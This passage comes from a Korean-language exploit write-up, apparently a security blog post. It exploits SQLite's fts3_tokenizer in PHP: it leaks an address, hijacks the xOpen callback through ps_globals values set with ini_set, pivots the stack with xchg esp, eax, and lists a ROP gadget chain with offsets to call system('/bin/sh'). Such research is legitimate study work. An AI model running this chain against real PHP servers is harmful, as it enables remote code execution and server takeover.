  <span class="token punctuation">}</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$result</span><span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$result</span><span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":memory:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select hex(fts3_tokenizer('simple')) addr;"</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$leaked_addr</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">flip</span><span class="token punctuation">(</span><span class="token variable">$leaked_addr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<h3 id="fts3-tokenizer-callback" style="position:relative;"><a href="#fts3-tokenizer-callback" aria-label="fts3 tokenizer callback permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3 tokenizer callback</h3>
<ul>
<li>2번째 인자인 callback 주소를 컨트롤 하여 임의의 값으로 덮여 씌어진 것을 확인 할 수 있습니다.</li>
<li><code class="language-text">edi</code> 레지스터를 조작해 원하는 방향을 이동이 가능한 것을 확인할 수 있습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4y32U6XKiUBSEMTHqGBVXXOOuiGzigrtGy8oyM+//Oj112sEKcWp+UBQXbt/vnO6D0u1PMBr7aHVs9AYe5FkfLzAczWE5Gwz02W29Wteh5prIFVoolLrI5pt4iOYQeczyLpdSqenQjQUMcwlvdqS4CBimD9Ne8V2jOUalNuShuUIb8R8akqkqEsnyveBLy0Sn52IyPZCqVO4hGivg8SnPD2KJIjcokcz1elBDVyAW3JWi1oM3O5Ck1bXRH05JKeUpShqFUgf5YpuH1ZtjKEqKm79ShQif0zVsdu8wnTWcyRazxSt2h08MjTkFaw0DWqWP5foC292i/mKw7GvpJSgRNUyYytSwWJ5JJX0TI2b+iW0QQSEtal1MpnvM/RMPLFcHbI2sxxKle8LV5g2Ot6Oo6+3gry909Uo4oqMiZLkbGiNmPMWLJJRehwSFcLv/oCmWsybJavt2E2y2LTosPRRno7H8/015TldZythaMXOmveazkIig9EyMu5qUokiQgH+aklLrOLz+IpmUG5giWRRBiZUEWXIqSRDyfLHDaH0VuglKGdP5kdPRG3rc6E73FJLcaZUBY2P9TYGU/50qJJhW6ziefnNKXG+P+fKMzf6DeSRh26KrfOefMbZXIbrvwiQUscFohr4+vY1gQChiQjgyfSZBSKWHwdQEojdT0moD++NP9tB2Nyx/e/ikQUEPJdjSBgm3ZFXyl0hqnOk7QsmU5E5ONqwlnMkO/uqCdtehq9ccdniQTIq4Xyr3SS1/njtBmQj5UEat0TTZ9GtUuognNTqayb5wTUi5KfhRRDJ3Jf8BBjCmWCl/LGYAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/21ee7ce62817f36943371acf662f8f00/37523/7.png"
        srcset="/static/21ee7ce62817f36943371acf662f8f00/e9ff0/7.png 180w,
/static/21ee7ce62817f36943371acf662f8f00/f21e7/7.png 360w,
/static/21ee7ce62817f36943371acf662f8f00/37523/7.png 720w,
/static/21ee7ce62817f36943371acf662f8f00/83e77/7.png 889w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>하지만 해당 레지스터를 활용해서 Stack Pivot를 하기에는 어려움이 있기 때문에 <code class="language-text">xOpen</code> 의 pInput을 트리거하는 방식으로 조작해보겠습니다.</li>
</ul>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>xOpen<span class="token punctuation">)</span> <span class="token punctuation">(</span>sqlite3_tokenizer <span class="token operator">*</span>pTokenizer<span class="token punctuation">,</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pInput<span class="token punctuation">,</span>
	<span class="token keyword">int</span> nBytes<span class="token punctuation">,</span>
	sqlite3_tokenizer_cursor <span class="token operator">*</span><span class="token operator">*</span>ppCursor
<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<ul>
<li>만약 xCreate 를 모두 제어하기 위해서는 xOpen을 제어할 수 있는 연속적인 메모리 데이터 3개 이상이 필요합니다.</li>
<li>이를 위해서 <code class="language-text">PHP.ini</code> list의 값을 설정합니다.</li>
</ul>
<p><strong>PHP.ini (Structure _php_ps_globals)</strong></p>
<ul>
<li>Expand PHP Module의 코드를 보면 해당 ini 구조체가 정의되어 있으며 이러한 자료구조는 프로세스 상에서 전역적으로 존재하고 <code class="language-text">.bss</code> 섹션에 포함되어 있기 때문에 위치를 알 수 있으며 공격하는데 있어서 좋은 벡터입니다.</li>
</ul>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">// https://www.php.net/manual/en/ini.list.php</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_php_ps_globals</span> <span class="token punctuation">{</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>save_path<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>session_name<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>id<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>extern_referer_chk<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>entropy_file<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>cache_limiter<span class="token punctuation">;</span>
	<span class="token keyword">long</span> entropy_length<span class="token punctuation">;</span>
	<span class="token keyword">long</span> cookie_lifetime<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>cookie_path<span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>cookie_domain<span class="token punctuation">;</span>
	zend_bool  cookie_secure<span class="token punctuation">;</span>
	zend_bool  cookie_httponly<span class="token punctuation">;</span>
	ps_module <span class="token operator">*</span>mod<span class="token punctuation">;</span>
	ps_module <span class="token operator">*</span>default_mod<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>mod_data<span class="token punctuation">;</span>
	php_session_status session_status<span class="token punctuation">;</span>
	<span class="token keyword">long</span> gc_probability<span class="token punctuation">;</span>
	<span class="token keyword">long</span> gc_divisor<span class="token punctuation">;</span>
	<span class="token keyword">long</span> gc_maxlifetime<span class="token punctuation">;</span>
	<span class="token keyword">int</span> module_number<span class="token punctuation">;</span>
	<span class="token keyword">long</span> cache_expire<span class="token punctuation">;</span></code></pre></div>
<ul>
<li>앞서 구조체에서 활용하는 필드는 빨간색으로 주석 처리한 부분을 사용할 예정이며, 포인터 구조와 정수 형태를 트리거할 수 있는 필드를 선정하여 가젯들이 적용할 수 있는 범위를 늘렸습니다.</li>
<li>php.ini 항목을 조작하여 fts3 tokenizer 모듈 구조체를 조작할 수 있습니다.</li>
</ul>
<h3 id="fts3-tokenizer-두-번째-인자-ebp-레지스터-조작" style="position:relative;"><a href="#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91" aria-label="fts3 tokenizer 두 번째 인자 ebp 레지스터 조작 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</h3>
<ul>
<li>두 번쨰 인자 ebp 레지스터를 다양한 메모리 범위로 조작이 가능하기 때문에 php.ini 의 <code class="language-text">ps_globals</code> 의 구조체를 사용하기 위해 <code class="language-text">gc_probability</code> 필드의 주소를 지정하였고 해당 위치로 이동하기 에 있어 <code class="language-text">-0x4</code> 바이트 연산을 해서 호출원에서 계산 된 오프셋을 조작하였습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQY0z2Q2U7CYBCFf3YoLRQQWkpFUBarhbYsDdZSliIERaIhJt75/k9xzEyMVzOZzJz5zhGT+RreNILtBFwdbwm1eoNavYt2x0b3zkGl1oHZfoBuDCDJTeQlDbc9F4ZpIZmuoKH3eVeSdYgwOmLmb+F4IRbBC/ynHR/K5RbW23ds4jNEsoyR+4z98QKt2Udd6+Hy9YPl6hXpbA3+Ika8/2AIQUT2OMDAmsGdLFm4dW2hqBhYbU6I1m9IZap4HC1wOF74iIh3+0+MvZAJyRk9J2ciCA9wpxGG1pzFqCd85Y+QREmQIjmdv2GY92ybHlAcJNgfTjHzN1BUE4KGhaKOXKHxn082X2crlEmhqPERzeVSC5ncFUcghAKRKCGRUrkKIXP/CxNqjhNe+sh1AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/baacb06fc343009d4872d0068294f270/37523/8.png"
        srcset="/static/baacb06fc343009d4872d0068294f270/e9ff0/8.png 180w,
/static/baacb06fc343009d4872d0068294f270/f21e7/8.png 360w,
/static/baacb06fc343009d4872d0068294f270/37523/8.png 720w,
/static/baacb06fc343009d4872d0068294f270/1e088/8.png 840w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>ps_globals의 <code class="language-text">gc_probability</code>, <code class="language-text">gc_divisor</code>, <code class="language-text">gc_maxlifetime</code> 해당 필드는 셋 전부 long 타입을 갖는 필드 입니다.</li>
<li><code class="language-text">xOpen</code> 을 트리거하기 위해서는 정상적으로 <code class="language-text">xCreate</code> 가 동작한 후에 <code class="language-text">insert query</code> 가 실행되어야 합니다. 그렇기 때문에 fts3 table <code class="language-text">simple</code> 의 <code class="language-text">simple_create</code> 해시 테이블 주소를 콜백으로 변경하여 <code class="language-text">xOepn</code> 함수로 갈 경로를 만들어 봅시다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNklEQVQY02WRaU/CQBiEUa5KEGmB2tRCaWnlElpALqEC4RQbjSVoICpfTPT//4Ex+yYYDB8mu9njmdlZn1Xro1huQ9UqSKtlGPk6hGQWwXASslKErBTgDwrgE1mac5FLUkoyEBcyOA3wOPHHaWTytbsTNJojRGMylEwJb9svMuAiIqYLD9O5h0AogZtqF956R6Z8QoX7tEHPWRDsH9AZLtHtzSAkNWg5C++fP6hYPUoxW6zw4L5SWrvuYPvxDVWvUNrVeofByD0G1m4HqNp9RGNXkOQ8OefMGkJcCs5gSWIJC6UW3OcN1RCLp8ms1RkfA5udMay6A1EyYeYbmMxekNWrCJ+JYHt3/TkB2Rp7oigZOL9QKDE7f9Th/fARumFDN23qiXXkD/KUUJKv/z5lf2Gvw7VD4C+nJqeQLk/kqAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png"
        srcset="/static/6db69931f8bc72d39cf86bbb2ed4df15/e9ff0/9.png 180w,
/static/6db69931f8bc72d39cf86bbb2ed4df15/f21e7/9.png 360w,
/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png 720w,
/static/6db69931f8bc72d39cf86bbb2ed4df15/5b481/9.png 846w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>현재 환경에서 <code class="language-text">0xe3bbc0</code> 의 주소는 <code class="language-text">simpleCreate</code> 객체를 가리키고 다음 <code class="language-text">0x7fffffff</code> 두 값들은 임의로 집어넣은 값입니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQI1x3MYQqCMACAUVPLFJVp22w6QZMpaCEhmD+6/7W+oHeA58WyI1UDWrSYvEGmBissVrSUeU1W1KTGEcuerHLEicG/SMKrJogU/vmG5+ecAoEfFnhiWNHTh6ed2eqRpRrYmonVjDgzcO8m1LwjlwO1HOj+TWFelI+Dst+R7ksiR4JI/tMfs4EzcOgpS4wAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png"
        srcset="/static/f4ca616e40d5344f5d77255f3092c4c6/e9ff0/10.png 180w,
/static/f4ca616e40d5344f5d77255f3092c4c6/f21e7/10.png 360w,
/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png 720w,
/static/f4ca616e40d5344f5d77255f3092c4c6/cecac/10.png 728w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>php의 <code class="language-text">ini_set</code> 메서드를 이용해서 각 전역 필드에 값을 넣어 줍니다.</li>
<li>앞서 xOpen 을 활용하기 위해 세 개의 메모리 대역이 필요하다고 했는데 이를 <code class="language-text">ps_globals</code> 필드를 활용하였습니다.</li>
<li>필드의 값이 어디 부분에서 터지는지를 확인하기 위해 임의의 데이터를 넣은 결과 <code class="language-text">eip</code> 레지스터를 조작할 수 있습니다.</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQoz5XSTXOCMBAG4BWtVgVSEFJUEAREHT9bqtVeOszYW///33mdrKPVg1M5bJI95MlmExomK7ivKYQVoG10Uam+oPpkX0LlWs3iuF7fC1KbiNroB1N87g8IhwvO1bzdHxBEc1DFfBglHkjHaPyO7+IX4+kG0hshTteYLXaQXnoD/lvhH5gj3xSI4iUaTReDaM647UTlwPqzy6Dq5e7rB344Q61uc55vC3i9rBzY0rvcM1WZCkcmjAhrAEP4IE2UexQiE0QGkuwNVidEz59AN/t8yBlT0CPYCdQEXzmbfHB1jozRaMrS3+UMHgF3Wbt/cgVUNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png"
        srcset="/static/6227d5a0df36cef3a1d595e8b3994e79/e9ff0/11.png 180w,
/static/6227d5a0df36cef3a1d595e8b3994e79/f21e7/11.png 360w,
/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png 720w,
/static/6227d5a0df36cef3a1d595e8b3994e79/c1328/11.png 866w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li>해당 함수가 호출하는 호출 구간은 <code class="language-text">call [edx+0xc]</code> 형태로 <code class="language-text">edx</code> 레지스터를 기준으로 call이 되어지고 <code class="language-text">eax</code> 레지스터에는 xOpen의 <code class="language-text">insert in to query</code>의 value 값이 포함된 것을 확인할 수 있습니다.</li>
</ul>
<h3 id="stack-pivot를-이용한-payload-data-메모리-위치-변경-작업" style="position:relative;"><a href="#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85" aria-label="stack pivot를 이용한 payload data 메모리 위치 변경 작업 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</h3>
<ul>
<li>앞서 취약점을 활용하여 프로그램 카운터를 조작이 가능한 상태입니다.</li>
<li>원하는 메모리 번지의 대역을 eax 레지스터가 참조하고 있는 구조</li>
</ul>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI133OvQ6CMABFYbQtYpGflhRaDJEEq6iLvv/DHQODg4kON2f7cpO88hg3Ys0JJS1KWcRSaZGiRiiDyBwbUZNsq7VbaT79XmKLwGuYufvIo5t4hgtXNzL3kXOIxDAxDjd80dOVPXnmSH5gK3jQHqM7yr2j0i0291jdousjuhlXQImaNG3YpQ3iz7sFfAMSPEXyTROC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png"
        srcset="/static/3ac23bc623be2a035e32088d57b9fee9/e9ff0/12.png 180w,
/static/3ac23bc623be2a035e32088d57b9fee9/f21e7/12.png 360w,
/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png 720w,
/static/3ac23bc623be2a035e32088d57b9fee9/20982/12.png 778w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<ul>
<li><code class="language-text">insert into a value</code> 값으로 ROP를 수행할 수 있는 영역으로 만들기 위해 <code class="language-text">XCHG</code> 가젯을 이용하여 eax 레지스터와 esp 레지스터를 체인하여 현재 프로그램 카운터가 생성된 페이로드 데이터의 메모리 대역으로 이동하도록 변경하였습니다.</li>
</ul>
<div class="gatsby-highlight" data-language="wasm"><pre class="language-wasm"><code class="language-wasm">xchg esp, eax;
ret;</code></pre></div>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
    >
      <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY01WQaU/CQBCGl0PkqCBqactRoeVubRHlKAQolpZYqIox4v//I6/ZMYT4YbKZ2Z1nnln2NHLRMyeoqn00dBuS0kbi4gZZQaaapLQQS1yjUKyhdm9AlJtg8QLuShrUuglR0imPJ4sUbBMcqJjJyQijI9yXCJeZEqRyG7u3HzjzgBr01iPC/RGD4RKMCTDtGfztAdZgDsauzkDXi8hKyFewWIWYznyksxJKchOe/46xsyFDbr8Nv2APF2AsB8Ny4G8/0e4+/wd6wQfK1S4BX/ffWLo7pNIilEqHjMdTj4Bq44HsOYgb9owJVus9Ov0RWCx/BmpNm9blEN7E4X9/qKCuWbT66XEydUt3fAA/efA6z0/AXze9iQhuLwfFAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="PHP"
        title="PHP"
        src="/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png"
        srcset="/static/f542ba31671d5ad8462ff0a5e69c49ca/e9ff0/13.png 180w,
/static/f542ba31671d5ad8462ff0a5e69c49ca/f21e7/13.png 360w,
/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png 720w,
/static/f542ba31671d5ad8462ff0a5e69c49ca/7de01/13.png 794w"
        sizes="(max-width: 720px) 100vw, 720px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
    </span></p>
<h3 id="rop-기법을-활용하여-rce-취약점-수행" style="position:relative;"><a href="#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89" aria-label="rop 기법을 활용하여 rce 취약점 수행 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP 기법을 활용하여 RCE 취약점 수행</h3>
<ul>
<li>앞서 취약점 활용하여 원하는 가젯들을 체인할 수 있는 벡터를 마련하였습니다.</li>
<li>중요한 사실은 RCE를 발생하기 위해서 “/bin/sh” 명령을 내리기 위해 문자열이 있는 메모리 공간이 있어야 합니다.</li>
<li>읽기/쓰기 가 가능한 메모리 영역으로 문자열을 쓰기 위해 하드 코딩으로 문자열을 4바이트씩 끊어 가면서 메모리 상에 쓰고 마지막에 널 바이트를 추가합니다.</li>
<li>시스템 라이브러리 함수를 호출할 때 해당 문자열의 포인터 주소를 불러와서 호출을 진행합니다.</li>
</ul>
<div class="gatsby-highlight" data-language="wasm"><pre class="language-wasm"><code class="language-wasm">## command move step <span class="token punctuation">(</span><span class="token number">0</span>~<span class="token number">5</span> repeat<span class="token punctuation">)</span>
pop eax ; ret               --------> libsqlite3_gadget<span class="token punctuation">(</span><span class="token number">0x00305337</span><span class="token punctuation">)</span> -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x82337</span><span class="token punctuation">)</span>  -> server<span class="token punctuation">(</span><span class="token number">0xe9c337</span><span class="token punctuation">)</span>
;command<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                 --------> CMD
pop edx ; ret               --------> libsqlite3_gadget<span class="token punctuation">(</span><span class="token number">0x00305e09</span><span class="token punctuation">)</span> -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x82e09</span><span class="token punctuation">)</span>  -> server<span class="token punctuation">(</span><span class="token number">0xe9ce09</span><span class="token punctuation">)</span>
;writable <span class="token keyword">memory</span>            --------> libsqlite3+<span class="token punctuation">(</span><span class="token number">0x8eaa0</span><span class="token number">-0x18</span><span class="token punctuation">)</span>                         -> server<span class="token punctuation">(</span><span class="token number">0xea8a88</span>, <span class="token number">0xea8a8c</span>, <span class="token number">0xea8a90</span>, <span class="token number">0xea8a94</span>, <span class="token number">0xea8a98</span>,<span class="token number">0xea8a9c</span>, <span class="token number">0xea8aa0</span><span class="token punctuation">)</span>
mov [edx<span class="token number">+0x18</span>], eax ; ret   --------> libc-2_gadget<span class="token punctuation">(</span><span class="token number">0x004e3642</span><span class="token punctuation">)</span>     -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x2a642</span><span class="token punctuation">)</span>  -> server<span class="token punctuation">(</span><span class="token number">0xa0d642</span><span class="token punctuation">)</span>

## <span class="token keyword">call</span> system
pop eax ; ret               --------> libsqlite3_gadget<span class="token punctuation">(</span><span class="token number">0x00305337</span><span class="token punctuation">)</span> -> <span class="token keyword">offset</span><span class="token punctuation">(</span><span class="token number">0x82337</span><span class="token punctuation">)</span>     -> server<span class="token punctuation">(</span><span class="token number">0xe9c337</span><span class="token punctuation">)</span>
;lib_system                 --------> libc<span class="token number">-2</span><span class="token number">+0x3af60</span>                                       -> server<span class="token punctuation">(</span><span class="token number">0xa1df60</span><span class="token punctuation">)</span>
